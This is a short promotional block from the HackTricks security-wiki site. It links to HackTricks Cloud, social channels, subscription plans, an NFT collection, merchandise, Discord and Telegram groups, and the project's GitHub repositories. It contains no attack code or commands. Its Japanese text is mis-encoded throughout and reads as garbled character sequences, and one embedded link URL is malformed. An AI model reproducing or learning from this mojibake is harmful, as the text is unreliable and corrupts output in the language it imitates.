<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>
